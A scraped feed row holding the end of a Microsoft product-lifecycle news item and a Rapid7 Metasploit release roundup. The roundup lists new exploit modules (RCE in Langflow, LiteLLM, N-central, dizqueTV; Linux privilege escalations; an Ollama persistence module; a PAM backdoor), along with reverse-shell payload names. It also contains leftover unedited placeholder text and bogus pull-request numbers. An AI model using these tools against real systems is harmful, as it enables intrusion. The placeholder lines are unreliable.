+In Microsoft product lifecycle news, today sees Windows 11 24H2 Home & Pro reach end of servicing, while Windows Server 2022 moves to extended support, with free critical security updates continuing but no further feature development. Also this month, the final curtain falls for Windows Server 2012 and 2012 R2 with the expiry of the third and final year of cash-for-updates Extended Security Update (ESU) program for these aging workhorses. Microsoft lists the end of ESU Year 3 on October 14, 2026, in both cases. Microsoft has a long history of providing at least some security patches for products beyond the end of support, with Server 2008 being a case in point, but the time to move past Server 2012 is now. Office 2021 also moves into retirement on October 14; this includes the Long-Term Servicing Channel, with no ESU available in that case.
+
+Also on October 15, 2026, Exchange Server 2016 and Exchange Server 2019 finally join the “no ESU” club, after two previous six-month reprieves. Microsoft seems to really mean it this time, since any future Exchange Server CVEs released by MSRC will stop mentioning Exchange 2016 and 2019. However, Microsoft points out that a lack of warnings does not mean those unsupported versions are not vulnerable to future security issues."
+98f370b7f1ac,98f370b7f1ac,2026-10-09 11:00 UTC,General Security News,Rapid7,Rapid7 Blog,Endpoint Security; Vulnerability Management; AI Security; File Security,Article,Metasploit Wrap Up: A Collection of What Can Only Be Called Eclectic Modules,https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-a-collection-of-what-can-only-be-called-eclectic-modules,"The aforementioned CVE tracks a vulnerability that when an invalid image is sent to vLLM's multimodal endpoint, PIL throws an error which contains a heap address that can be...","I’m not sure how else to describe this release’s module content. Four modules targeting LLMs, two Linux LPE’s, 12 Windows AARCH64 fetch payloads, a TV streaming RCE, and a scanner targeting a CVE from 26 years ago? It is a privilege to work with committers and contributors with such varied passions, and who knows, next release we might have a Novell Netware module and then we really will party like it’s 1999!
+
+New module content (12)
+
+vLLM Multimodal Heap-Address Information Leak Scanner
+
+Author: Kenneth LaCroix
+
+Type: Auxiliary
+
+Pull request: #21592 contributed by kenlacroix
+
+Path: scanner/http/vllm_multimodal_info_leak
+
+CVE reference: CVE-2026-22778
+
+Description: This adds an auxiliary scanner module vllm_multimodal_info_leak that detects vLLM OpenAI-compatible servers affected by CVE-2026-22778. The aforementioned CVE tracks a vulnerability that when an invalid image is sent to vLLM's multimodal endpoint, PIL throws an error which contains a heap address that can be chained with a heap overflow to achieve RCE on the target system.
+
+CVE-2000-0979 SMB Share Password Enumerator
+
+Authors: Azbil SecurityFriday Co Ltd and Zoltan Balazs <zoltan1.balazs <Zoltan Balazs [email protected] @zh4ck>
+
+Type: Auxiliary
+
+Pull request: #0
+
+Path: scanner/smb/cve_2000_0979
+
+CVE reference: CVE-2000-0979
+
+Description: Unable to find PR information, please complete manually
+
+N-able N-central Struts BeanUtils Unauthenticated RCE
+
+Author: sfewer-r7
+
+Type: Exploit
+
+Pull request: #21896 contributed by sfewer-r7
+
+Path: linux/http/nable_ncentral_unauth_rce_cve_2026_86218
+
+CVE reference: CVE-2026-86218
+
+Description: This adds an exploit module for CVE-2026-86218, unauthenticated RCE against N-able N-central versions 2026.3.1.13 and below.
+
+Local Privilege Escalation in snapd
+
+Authors: Qualys Security Advisory Team and msutovsky-r7
+
+Type: Exploit
+
+Pull request: #21532 contributed by msutovsky-r7
+
+Path: linux/local/cve_2026_3888
+
+CVE reference: CVE-2026-3888
+
+Description: Adds a module targeting CVE-2026-3888, a TOCTOU race condition in snap-confine, the SUID binary used by the snapd package manager to enforce snap sandbox boundaries.
+
+DirtyClone LPE
+
+Authors: Eddy Tsalolikhin, Or Peles, and msutovsky-r7
+
+Type: Exploit
+
+Pull request: #21613 contributed by eipoverflow
+
+Path: linux/local/dirtyclone_cve_2026_43503
+
+CVE reference: CVE-2026-43503
+
+Description: This adds a local exploit module for DirtyClone.
+
+dizqueTV Unauthenticated Remote Code Execution
+
+Authors: Ahmed Said Saud Al-Busaidi and Muhammad Sulthon Nurbahari
+
+Type: Exploit
+
+Pull request: #21787 contributed by 0x5chltz
+
+Path: multi/http/dizquetv_rce
+
+CVE reference: CVE-2024-58286
+
+Description: Adds an exploit module for EDB-52079, an unauthenticated remote code execution targeting dizqueTV, a Node.js-based IPTV streaming server.
+
+Langflow Unauthenticated RCE (validate endpoint)
+
+Authors: Diamorphine and bhaskarbhar
+
+Type: Exploit
+
+Pull request: #21750 contributed by bhaskarbhar
+
+Path: multi/http/langflow_rce_cve_2026_0770
+
+CVE reference: CVE-2026-0770
+
+Description: Adds a module targeting CVE-2026-0770, an unauthenticated remote code execution in Langflow versions <= 1.7.3.
+
+BerriAI LiteLLM Proxy MCP Test Endpoint Command Execution
+
+Author: Kenneth LaCroix
+
+Type: Exploit
+
+Pull request: #21585 contributed by kenlacroix
+
+Path: multi/http/litellm_mcp_test_cmd_injection
+
+CVE reference: CVE-2026-42271
+
+Description: Adds an exploit module for CVE-2026-42271, a command execution flaw in the BerriAI LiteLLM proxy's MCP ""test"" REST endpoints.
+
+OpenCTI JSON Mapper safeEjs Sandbox Escape RCE
+
+Author: Ege Balci
+
+Type: Exploit
+
+Pull request: #21884 contributed by EgeBalci
+
+Path: multi/http/opencti_jsonmapper_safeejs_rce
+
+Description: This adds a sandbox escape exploit for OpenCTI's SafeJS to achieve RCE as root inside the platform's API container in versions >= 6.8.16.
+
+Ollama Windows Auto-Update Path Traversal Persistence
+
+Authors: Bartłomiej Dmitruk and h00die
+
+Type: Exploit
+
+Pull request: #21423 contributed by h00die
+
+Path: windows/persistence/ollama_auto_update
+
+CVE reference: CVE-2026-42249
+
+Description: This adds a persistence module for ollama auto update.
+
+FTP, HTTP, HTTPS and TFTP Fetch, Windows AArch64 Command Execution
+
+Authors: Alexander ""xaitax"" Hagenah, Brendan Watters, and alanfoster
+
+Type: Payload (Adapter)
+
+Pull request: #21890 contributed by vinicius-batistella
+
+Description: Adds Windows AArch64 fetch adapters.
+
+This adapter adds the following payloads:
+
+cmd/windows/ftp/aarch64/exec
+
+cmd/windows/ftp/aarch64/shell/reverse_tcp
+
+cmd/windows/ftp/aarch64/shell_reverse_tcp
+
+cmd/windows/http/aarch64/exec
+
+cmd/windows/http/aarch64/shell/reverse_tcp
+
+cmd/windows/http/aarch64/shell_reverse_tcp
+
+cmd/windows/https/aarch64/exec
+
+cmd/windows/https/aarch64/shell/reverse_tcp
+
+cmd/windows/https/aarch64/shell_reverse_tcp
+
+cmd/windows/tftp/aarch64/exec
+
+cmd/windows/tftp/aarch64/shell/reverse_tcp
+
+cmd/windows/tftp/aarch64/shell_reverse_tcp
+
+Linux PAM Backdoor
+
+Author: h00die
+
+Type: Post
+
+Pull request: #21516 contributed by h00die
+
+Path: linux/manage/pam_backdoor
+
+Description: Adds a module allowing a user to upload a pam so file (or compile on system if not x64) into the auth chain.
+
+Enhancements and features (4)
+
+#21680 from messede-degod - This updates the post/linux/gather/enum_protections module to detect AV/EDR inside the target system.
+
+#21887 from dwelch-r7 - Adds a Rake-based module generator (rake msf:generate[TYPE,PATH,PLATFORM,ARCH]) that scaffolds new modules skeletons for all available module types, together with a matching documentation skeleton under documentation/modules/.
+
+#21935 from jheysel-r7 - Adds additional fingerprint support for Gitlab 19.0.0-19.4.0.
+
+#21936 from satanonsteroids2024-zzz - Improves msfvenom option handling error message.
+
+Bugs fixed (8)
+
+#21548 from msutovsky-r7 - Adds documentation and Improves reliability for fileless fetch payloads using the shell-search option on systems where anonymous file handles either don't exist or existing user does not have permission to write the payload into them.
+
+#21878 from Benziza - Fixes search type:-aux so the aux shorthand correctly excludes auxiliary modules, matching the behavior of search type:-auxiliary.
+
+#21882 from revanth3205 - Fixes some exists? checks to now more accurately check for .directory? in several modules.
+
+#21906 from Pushpenderrathore - Fixes a bug in the Web Enrollment library where a dropped connection or timeout between the request to create the certificate and the request to download the certificate. Previously the timeout was unhandled which caused the module to stop without downloading the certificate that had been created. This change handles the exception and prints out the warning.
+
+#21923 from kx7m2qd - Fixes some exists? checks to now more accurately check for .directory? and writable? in several modules.
+
+#21959 from revanth3205 - Fixes missing ip:port prefixes for the console output in the MSSQL and SSH login scanners.
+
+#21969 from pauljccode - Freeze time in the rate limiter concurrency spec.
+
+#21982 from kx7m2qd - Fixes duplicate ip:port prefixes in the output of the PostgreSQL login scanner.
+
+Documentation
+
+You can find the latest Metasploit documentation on our docsite at docs.metasploit.com.
+
+Errors (1)
+
+PLEASE IDENTIFY THE ERRORS BELOW AND FIX MANUALLY AS PART OF YOUR WRITE UP
+
+#-1 from unknown-value-for-login - Error - could not find pull request 'Merge pull request #21072 from Z6543/add-cve-2000-0979-module Add module for CVE-2000-0979 Windows 9x/Me SMB share password enumeration' for commit '06d58967fc049479241903e8ab95c003f27c9c42' - verify the pull request message is valid
+
+Get it
+
+As always, you can update to the latest Metasploit Framework with msfupdate and you can get more details on the changes since the last blog post from GitHub:
+
+Pull Requests 6.5.5...6.5.6
+
+Full diff 6.5.5...6.5.6
+
+If you are a git user, you can clone the Metasploit Framework repo (master branch) for the latest. To install fresh without using git, you can use the open-source-only Nightly Installers or the commercial edition Metasploit Pro"
